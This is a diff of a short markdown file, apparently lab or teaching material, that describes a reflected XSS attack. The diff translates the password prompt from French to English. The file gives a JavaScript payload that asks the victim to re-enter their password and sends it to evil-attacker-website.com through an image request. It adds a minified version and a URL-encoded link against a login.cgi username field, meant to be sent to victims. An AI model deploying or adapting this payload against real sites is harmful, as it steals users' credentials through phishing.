@@ -1,7 +1,7 @@
 # XSS attack
 Here is the script we would like to execute on the victim's machine
 
-    var p = prompt("Veuillez entrez a nouveau votre mot de passe");
+    var p = prompt("Please, enter your password again");
     o = document.createElement('img');
     o.setAttribute('src', 'http://www.evil-attacker-website.com/password=' + p);
     document.body.appendChild(o);
@@ -10,11 +10,11 @@ This code will prompt for the user's password, create an image with the password
 
 ## Minified version
 
-    var p=prompt("Veuillez entrez a nouveau votre mot de passe");o=document.createElement('img');o.setAttribute('src','http://www.evil-attacker-website.com/password='+p);document.body.appendChild(o)
+    var p=prompt("Please, enter your password again");o=document.createElement('img');o.setAttribute('src','http://www.evil-attacker-website.com/password='+p);document.body.appendChild(o)
 
 ## URL to attack, only work in Firefox:
 Send this URL to a victim to start the attack.
 This not a permanent XSS attack.
 > Replace "localhost" by the server name
 
-http://localhost/cgi-bin/login.cgi?username=%3Cscript%3Evar%20stolenPassword%20=%20prompt(%22Veuillez%20entrez%20%C3%A0%20nouveau%20votre%20mot%20de%20passe%22);o%20=%20document.createElement(%27img%27);o.setAttribute(%27src%27,%20%27http://www.evil-attacker-website.com/password=%27%20+%20stolenPassword);document.body.appendChild(o);%3C/script%3E&password=foobar
+http://localhost/cgi-bin/login.cgi?username=%3Cscript%3Evar%20p=prompt(%22Please,%20enter%20your%20password%20again%22);o=document.createElement(%27img%27);o.setAttribute(%27src%27,%27http://www.evil-attacker-website.com/password=%27+p);document.body.appendChild(o);%3C/script%3E&password=foobar
